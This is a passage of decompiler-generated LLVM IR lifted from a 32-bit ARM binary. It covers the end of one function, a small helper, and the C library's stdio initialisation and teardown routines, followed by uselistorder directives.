  store i32 0, i32* @r1, align 4
  store i32 %v0_14a38, i32* %r2.global-to-local, align 4
  %v2_14a4471 = load i32, i32* %v1_14a38, align 4
  store i32 %v2_14a4471, i32* %r3.global-to-local, align 4
  %v3_14a4873 = icmp uge i32 %v2_14a4471, %v2_14a38
  store i1 %v3_14a4873, i1* %cpsr_c.global-to-local, align 1
  %v9_14a4879 = icmp eq i32 %v2_14a4471, %v2_14a38
  br i1 %v9_14a4879, label %dec_label_pc_14a50, label %dec_label_pc_14a68

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a38, %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge
  %v0_14a5080 = phi i32 [ %v1_14a48.pre, %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge ], [ %v2_14a38, %dec_label_pc_14a38 ]
  store i32 %v0_14a5080, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14a60 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a60, label %dec_label_pc_14a64, label %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge

dec_label_pc_14a50.dec_label_pc_14a44_crit_edge:  ; preds = %dec_label_pc_14a50
  %v0_14a44.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14a48.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a44 = inttoptr i32 %v0_14a44.pre to i32*
  %v2_14a44 = load i32, i32* %v1_14a44, align 4
  store i32 %v2_14a44, i32* %r3.global-to-local, align 4
  %v3_14a48 = icmp uge i32 %v2_14a44, %v1_14a48.pre
  store i1 %v3_14a48, i1* %cpsr_c.global-to-local, align 1
  %v9_14a48 = icmp eq i32 %v2_14a44, %v1_14a48.pre
  br i1 %v9_14a48, label %dec_label_pc_14a50, label %dec_label_pc_14a68

dec_label_pc_14a64:                               ; preds = %dec_label_pc_14a50
  %v0_14a64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a38, %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge, %dec_label_pc_14a64
  %v0_14a70 = phi i32 [ %v0_14a64, %dec_label_pc_14a64 ], [ %v2_14a4471, %dec_label_pc_14a38 ], [ %v2_14a44, %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge ]
  %v1_14a68 = phi i32 [ %v0_14a64, %dec_label_pc_14a64 ], [ %v2_14a38, %dec_label_pc_14a38 ], [ %v1_14a48.pre, %dec_label_pc_14a50.dec_label_pc_14a44_crit_edge ]
  %v3_14a68 = icmp uge i32 %v0_14a70, %v1_14a68
  store i1 %v3_14a68, i1* %cpsr_c.global-to-local, align 1
  %v9_14a68 = icmp eq i32 %v0_14a70, %v1_14a68
  br i1 %v9_14a68, label %dec_label_pc_14a70, label %dec_label_pc_14a68.dec_label_pc_14a38_crit_edge

dec_label_pc_14a68.dec_label_pc_14a38_crit_edge:  ; preds = %dec_label_pc_14a68
  %v0_14a38.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a70:                               ; preds = %dec_label_pc_14a68
  %v2_14a70 = icmp ne i32 %v1_14a68, 0
  store i1 %v2_14a70, i1* %cpsr_c.global-to-local, align 1
  %v7_14a74 = icmp slt i32 %v1_14a68, 2
  br i1 %v7_14a74, label %dec_label_pc_14a98, label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %dec_label_pc_14a70
  %v0_14a78 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14a78, i32* %r0.global-to-local, align 4
  %v0_14a7c = load i32, i32* @r1, align 4
  %v1_14a7c = add i32 %v0_14a7c, 129
  store i32 %v1_14a7c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a98

dec_label_pc_14a94:                               ; preds = %dec_label_pc_146d8, %dec_label_pc_146bc, %dec_label_pc_146e4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14a98

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a14, %dec_label_pc_14a70, %bb57, %dec_label_pc_1471c, %dec_label_pc_14a78, %dec_label_pc_14a94
  %v0_14a98 = load i32, i32* @r5, align 4
  store i32 %v0_14a98, i32* %r0.global-to-local, align 4
  %v2_14aa0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14aa0, i32* %r4.global-to-local, align 4
  store i32 %v6_1467c, i32* @r5, align 4
  store i32 %v9_1467c, i32* @r6, align 4
  store i32 %v12_1467c, i32* @r7, align 4
  store i32 %v15_1467c, i32* @r8, align 4
  ret i32 %v0_14a98

; uselistorder directives
  uselistorder i32 %v0_14a64, { 1, 0, 2 }
  uselistorder i32 %v1_14a48.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14a38, { 1, 0 }
  uselistorder i32 %v0_149e8, { 1, 0, 2 }
  uselistorder i32 %v1_149cc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_149bc, { 1, 0 }
  uselistorder i32 %v0_14964, { 1, 0, 2 }
  uselistorder i32 %v1_14948.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_148fc, { 1, 0, 2 }
  uselistorder i32 %v1_148e0, { 0, 2, 1 }
  uselistorder i32 %v4_148bc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1486c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_147f0, { 1, 2, 0 }
  uselistorder i32 %v1_14780, { 1, 0 }
  uselistorder i32 %v0_14780, { 1, 0 }
  uselistorder i32 %v1_14768, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1470c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 67, 68, 69, 0, 1, 32, 60, 33, 61, 34, 62, 35, 63, 36, 64, 37, 65, 15, 66, 2, 44, 28, 48, 29, 49, 27, 45, 30, 46, 31, 47, 3, 50, 4, 51, 5, 52, 6, 53, 7, 54, 8, 55, 9, 56, 10, 57, 11, 58, 12, 59, 38, 70, 13, 71, 14, 72, 17, 73, 40, 74, 41, 75, 42, 76, 16, 77, 39, 78, 79, 18, 80, 19, 81, 20, 82, 43, 83, 21, 84, 22, 85, 24, 86, 23, 87, 25, 88, 26, 89 }
  uselistorder i32 (i32, i32)* @__libc_open, { 4, 0, 3, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 12, 3, 0, 9, 8, 11, 10, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 ()* @malloc, { 31, 30, 5, 29, 4, 3, 2, 0, 1, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_14a98, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14a94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a50, { 1, 0 }
  uselistorder label %dec_label_pc_14a14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_149ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149d4, { 1, 0 }
  uselistorder label %dec_label_pc_14978, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_14968, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14950, { 1, 0 }
  uselistorder label %dec_label_pc_14910, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_14900, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14848, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_147b0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14758, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_146f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146bc, { 1, 2, 0 }
}

define i32 @function_14aac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14aac:
  %v0_14aac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14aac, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14aac
  %v5_14aac = sdiv i32 %arg2, 16
  %v6_14aac = and i32 %v5_14aac, %arg1
  %v5_14ab0 = sdiv i32 %arg2, 256
  %v6_14ab0 = and i32 %v6_14aac, %v5_14ab0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14aac, %bb
  %v7_14ab4 = phi i32 [ %arg1, %dec_label_pc_14aac ], [ %v6_14ab0, %bb ]
  ret i32 %v7_14ab4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_14ae4 = call i32 @__aeabi_read_tp()
  %v3_14ae8 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_14ae8 = sext i16 %v3_14ae8 to i32
  store i32 %v4_14ae8, i32* @r3, align 4
  store i32 %v0_14ae4, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_14af4 = add i32 %v4_14ae8, %v0_14ae4
  %v3_14af4 = inttoptr i32 %v2_14af4 to i32*
  %v4_14af4 = load i32, i32* %v3_14af4, align 4
  store i32 %v4_14af4, i32* @r6, align 4
  %v1_14af8 = call i32 @isatty(i32 0)
  %v2_14b00 = icmp eq i32 %v1_14af8, 0
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r4, align 4
  br i1 %v2_14b00, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_14b0c = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 308) to i16*), align 4
  %v7_14b0c = zext i16 %v5_14b0c to i32
  %v2_14b10 = xor i32 %v7_14b0c, 256
  store i32 %v2_14b10, i32* @r3, align 4
  %v2_14b14 = trunc i32 %v2_14b10 to i16
  store i16 %v2_14b14, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_14b1c = call i32 @isatty(i32 1)
  %v2_14b20 = icmp eq i32 %v1_14b1c, 0
  br i1 %v2_14b20, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_14b28 = load i32, i32* @r4, align 4
  %v2_14b2c = add i32 %v1_14b28, 376
  %v3_14b2c = inttoptr i32 %v2_14b2c to i16*
  %v4_14b2c = load i16, i16* %v3_14b2c, align 2
  %v2_14b30 = xor i16 %v4_14b2c, 256
  store i16 %v2_14b30, i16* %v3_14b2c, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_14b3c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_14b3c = sext i16 %v3_14b3c to i32
  %v0_14b40 = load i32, i32* @r6, align 4
  %v1_14b40 = load i32, i32* @r5, align 4
  %v3_14b40 = add i32 %v1_14b40, %v4_14b3c
  %v4_14b40 = inttoptr i32 %v3_14b40 to i32*
  store i32 %v0_14b40, i32* %v4_14b40, align 4
  ret i32 %v1_14b1c

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14b5c = load i32, i32* @r4, align 4
  store i32 %v3_14b5c, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_14b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_14b70, i32* %r0.global-to-local, align 4
  %v5_14b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_14b70, i32* %r1.global-to-local, align 4
  %v8_14b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33092) to i32*), align 4
  %v2_14b78 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_14b78, i32* %r3.global-to-local, align 4
  store i32 %v2_14b70, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_14b84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 152) to i32*), align 4
  store i32 %v2_14b70, i32* %r0.global-to-local, align 4
  store i32 %v5_14b70, i32* %r1.global-to-local, align 4
  store i32 %v8_14b70, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_14b94 = inttoptr i32 %v4_14b84 to i32*
  store i32 %v2_14b70, i32* %v1_14b94, align 4
  %v3_14b94 = add i32 %v4_14b84, 4
  %v4_14b94 = inttoptr i32 %v3_14b94 to i32*
  %v5_14b94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14b94, i32* %v4_14b94, align 4
  %v6_14b94 = add i32 %v4_14b84, 8
  %v7_14b94 = inttoptr i32 %v6_14b94 to i32*
  %v8_14b94 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14b94, i32* %v7_14b94, align 4
  %v0_14b98 = load i32, i32* %r3.global-to-local, align 4
  %v1_14b98 = inttoptr i32 %v0_14b98 to i32*
  %v2_14b98 = load i32, i32* %v1_14b98, align 4
  store i32 %v2_14b98, i32* %r0.global-to-local, align 4
  %v3_14b98 = add i32 %v0_14b98, 4
  %v4_14b98 = inttoptr i32 %v3_14b98 to i32*
  %v5_14b98 = load i32, i32* %v4_14b98, align 4
  store i32 %v5_14b98, i32* %r1.global-to-local, align 4
  %v6_14b98 = add i32 %v0_14b98, 8
  %v7_14b98 = inttoptr i32 %v6_14b98 to i32*
  %v8_14b98 = load i32, i32* %v7_14b98, align 4
  %v2_14b9c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14b9c, i32* %r3.global-to-local, align 4
  store i32 %v2_14b98, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_14ba8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14ba8 = add i32 %v0_14ba8, 76
  %v3_14ba8 = inttoptr i32 %v2_14ba8 to i32*
  %v4_14ba8 = load i32, i32* %v3_14ba8, align 4
  store i32 %v4_14ba8, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_14bb0 = inttoptr i32 %v4_14ba8 to i32*
  %v2_14bb0 = load i32, i32* %v1_14bb0, align 4
  store i32 %v2_14bb0, i32* %r5.global-to-local, align 4
  %v2_14bb4 = add i32 %v0_14ba8, 160
  %v3_14bb4 = inttoptr i32 %v2_14bb4 to i32*
  %v4_14bb4 = load i32, i32* %v3_14bb4, align 4
  store i32 %v2_14b98, i32* %r0.global-to-local, align 4
  store i32 %v5_14b98, i32* %r1.global-to-local, align 4
  store i32 %v8_14b98, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_14bc4 = add i32 %v0_14ba8, -33124
  store i32 %v2_14bc4, i32* %sl.global-to-local, align 4
  %v1_14bc8 = inttoptr i32 %v4_14bb4 to i32*
  store i32 %v2_14b98, i32* %v1_14bc8, align 4
  %v3_14bc8 = add i32 %v4_14bb4, 4
  %v4_14bc8 = inttoptr i32 %v3_14bc8 to i32*
  %v5_14bc8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14bc8, i32* %v4_14bc8, align 4
  %v6_14bc8 = add i32 %v4_14bb4, 8
  %v7_14bc8 = inttoptr i32 %v6_14bc8 to i32*
  %v8_14bc8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14bc8, i32* %v7_14bc8, align 4
  %v0_14c58.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c5816 = icmp eq i32 %v0_14c58.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14c6018 = add i32 %v0_14c58.pr, 56
  store i32 %v1_14c6018, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_14c5816, label %dec_label_pc_14c6c, label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %entry, %.thread10
  %v0_14bd0 = phi i32 [ %v3_14c54, %.thread10 ], [ %v0_14c58.pr, %entry ]
  %v1_14bd0 = add i32 %v0_14bd0, 64
  %v2_14bd0 = inttoptr i32 %v1_14bd0 to i32*
  %v3_14bd0 = load i32, i32* %v2_14bd0, align 4
  store i32 %v3_14bd0, i32* %r3.global-to-local, align 4
  %v0_14bd4 = call i32 @__aeabi_read_tp()
  store i32 %v0_14bd4, i32* %r0.global-to-local, align 4
  %v1_14bd8 = add i32 %v0_14bd4, -1168
  store i32 %v1_14bd8, i32* %r6.global-to-local, align 4
  %v3_14bdc = icmp uge i32 %v3_14bd0, %v1_14bd8
  store i1 %v3_14bdc, i1* %cpsr_c.global-to-local, align 1
  %v9_14bdc = icmp eq i32 %v3_14bd0, %v1_14bd8
  br i1 %v9_14bdc, label %.thread1, label %dec_label_pc_14bf0

.thread1:                                         ; preds = %dec_label_pc_14bd0
  %v1_14be0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14be0 = add i32 %v1_14be0, 60
  %v3_14be0 = inttoptr i32 %v2_14be0 to i32*
  %v4_14be0 = load i32, i32* %v3_14be0, align 4
  %v2_14be4 = add i32 %v4_14be0, 1
  store i32 %v2_14be4, i32* %r3.global-to-local, align 4
  store i32 %v2_14be4, i32* %v3_14be0, align 4
  br label %.thread10

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14bfc
  %v0_14bf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14bf0 = inttoptr i32 %v0_14bf0 to i32*
  %v2_14bf0 = load i32, i32* %v1_14bf0, align 4
  store i32 %v2_14bf0, i32* %r3.global-to-local, align 4
  %v1_14bf4 = load i32, i32* %r4.global-to-local, align 4
  %v3_14bf4 = icmp uge i32 %v2_14bf0, %v1_14bf4
  store i1 %v3_14bf4, i1* %cpsr_c.global-to-local, align 1
  %v9_14bf4 = icmp eq i32 %v2_14bf0, %v1_14bf4
  br i1 %v9_14bf4, label %dec_label_pc_14bfc, label %dec_label_pc_14c14

dec_label_pc_14bfc:                               ; preds = %dec_label_pc_14bf0
  store i32 %v2_14bf0, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14c0c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14c0c, label %dec_label_pc_14c10, label %dec_label_pc_14bf0

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14bfc
  %v0_14c10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14c10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14c14

dec_label_pc_14c14:                               ; preds = %dec_label_pc_14bf0, %dec_label_pc_14c10
  %v0_14c14 = phi i32 [ %v0_14c10, %dec_label_pc_14c10 ], [ %v2_14bf0, %dec_label_pc_14bf0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c14 = icmp eq i32 %v0_14c14, 0
  %v2_14c20.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_14c14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_14c14
  %v1_14c20 = load i32, i32* %r6.global-to-local, align 4
  %v3_14c20 = add i32 %v2_14c20.pre, 64
  %v4_14c20 = inttoptr i32 %v3_14c20 to i32*
  store i32 %v1_14c20, i32* %v4_14c20, align 4
  %v1_14c24 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c24 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c24 = add i32 %v2_14c24, 60
  %v4_14c24 = inttoptr i32 %v3_14c24 to i32*
  store i32 %v1_14c24, i32* %v4_14c24, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_14c14
  %v2_14c18 = add i32 %v2_14c20.pre, 8
  %v3_14c18 = inttoptr i32 %v2_14c18 to i32*
  %v4_14c18 = load i32, i32* %v3_14c18, align 4
  store i32 %v4_14c18, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_14c28 = add i32 %v2_14c20.pre, 20
  %v4_14c28 = inttoptr i32 %v3_14c28 to i32*
  store i32 %v4_14c18, i32* %v4_14c28, align 4
  %v1_14c2c = load i32, i32* %r2.global-to-local, align 4
  %v2_14c2c = trunc i32 %v1_14c2c to i16
  %v3_14c2c = load i32, i32* %r5.global-to-local, align 4
  %v4_14c2c = inttoptr i32 %v3_14c2c to i16*
  store i16 %v2_14c2c, i16* %v4_14c2c, align 2
  %v1_14c30 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c30 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c30 = add i32 %v2_14c30, 24
  %v4_14c30 = inttoptr i32 %v3_14c30 to i32*
  store i32 %v1_14c30, i32* %v4_14c30, align 4
  %v1_14c34 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c34 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c34 = add i32 %v2_14c34, 28
  %v4_14c34 = inttoptr i32 %v3_14c34 to i32*
  store i32 %v1_14c34, i32* %v4_14c34, align 4
  %v1_14c38 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c38 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c38 = add i32 %v2_14c38, 16
  %v4_14c38 = inttoptr i32 %v3_14c38 to i32*
  store i32 %v1_14c38, i32* %v4_14c38, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_14c3c = load i32, i32* %sl.global-to-local, align 4
  %v1_14c3c = inttoptr i32 %v0_14c3c to i32*
  %v2_14c3c = load i32, i32* %v1_14c3c, align 4
  store i32 %v2_14c3c, i32* %r0.global-to-local, align 4
  %v3_14c3c = add i32 %v0_14c3c, 4
  %v4_14c3c = inttoptr i32 %v3_14c3c to i32*
  %v5_14c3c = load i32, i32* %v4_14c3c, align 4
  store i32 %v5_14c3c, i32* %r1.global-to-local, align 4
  %v6_14c3c = add i32 %v0_14c3c, 8
  %v7_14c3c = inttoptr i32 %v6_14c3c to i32*
  %v8_14c3c = load i32, i32* %v7_14c3c, align 4
  store i32 %v8_14c3c, i32* %r2.global-to-local, align 4
  %v1_14c44 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c44 = add i32 %v1_14c44, 52
  %v3_14c44 = inttoptr i32 %v2_14c44 to i32*
  store i32 1, i32* %v3_14c44, align 4
  %v0_14c48 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c48 = add i32 %v0_14c48, 56
  store i32 %v1_14c48, i32* %r3.global-to-local, align 4
  %v2_14c4c = load i32, i32* %r0.global-to-local, align 4
  %v1_14c50 = inttoptr i32 %v1_14c48 to i32*
  store i32 %v2_14c4c, i32* %v1_14c50, align 4
  %v3_14c50 = add i32 %v0_14c48, 60
  %v4_14c50 = inttoptr i32 %v3_14c50 to i32*
  %v5_14c50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c50, i32* %v4_14c50, align 4
  %v6_14c50 = add i32 %v0_14c48, 64
  %v7_14c50 = inttoptr i32 %v6_14c50 to i32*
  %v8_14c50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14c50, i32* %v7_14c50, align 4
  %v0_14c54 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c54 = add i32 %v0_14c54, 32
  %v2_14c54 = inttoptr i32 %v1_14c54 to i32*
  %v3_14c54 = load i32, i32* %v2_14c54, align 4
  store i32 %v3_14c54, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c58 = icmp eq i32 %v3_14c54, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14c60 = add i32 %v3_14c54, 56
  store i32 %v1_14c60, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_14c58, label %dec_label_pc_14c6c, label %dec_label_pc_14bd0

dec_label_pc_14c6c:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_14c70 = load i32, i32* %r7.global-to-local, align 4
  %v2_14c70 = add i32 %v0_14c70, 76
  %v3_14c70 = inttoptr i32 %v2_14c70 to i32*
  %v4_14c70 = load i32, i32* %v3_14c70, align 4
  store i32 %v4_14c70, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_14c70 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c9014 = icmp eq i32 %storemerge12, 0
  br i1 %v2_14c9014, label %dec_label_pc_14c98, label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c6c, %dec_label_pc_14c90
  %v1_14c84 = phi i32 [ %storemerge, %dec_label_pc_14c90 ], [ %storemerge12, %dec_label_pc_14c6c ]
  %v1_14c7c = inttoptr i32 %v1_14c84 to i16*
  %v2_14c7c = load i16, i16* %v1_14c7c, align 2
  %v3_14c7c = zext i16 %v2_14c7c to i32
  store i32 %v3_14c7c, i32* %r3.global-to-local, align 4
  %v1_14c80 = and i32 %v3_14c7c, 64
  %v2_14c80 = icmp eq i32 %v1_14c80, 0
  br i1 %v2_14c80, label %dec_label_pc_14c90, label %bb39

bb39:                                             ; preds = %dec_label_pc_14c7c
  store i32 %v1_14c84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c7c, %bb39
  %v1_14c88 = xor i1 %v2_14c80, true
  call void @__pseudo_cond_branch(i1 %v1_14c88, i32 ptrtoint (i32* @global_var_14cc0.857 to i32))
  %v0_14c8c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c8c = add i32 %v0_14c8c, 32
  %storemerge.in = inttoptr i32 %v1_14c8c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c90 = icmp eq i32 %storemerge, 0
  br i1 %v2_14c90, label %dec_label_pc_14c98, label %dec_label_pc_14c7c

dec_label_pc_14c98:                               ; preds = %dec_label_pc_14c90, %dec_label_pc_14c6c
  %v2_14c9c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14c9c, i32* %r4.global-to-local, align 4
  %v1_14ca0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14ca0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_14c54, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14bf4, { 1, 0 }
  uselistorder i32 %v4_14bb4, { 2, 1, 0 }
  uselistorder i32 %v4_14b84, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 4, 3, 0, 2, 5, 6, 7 }
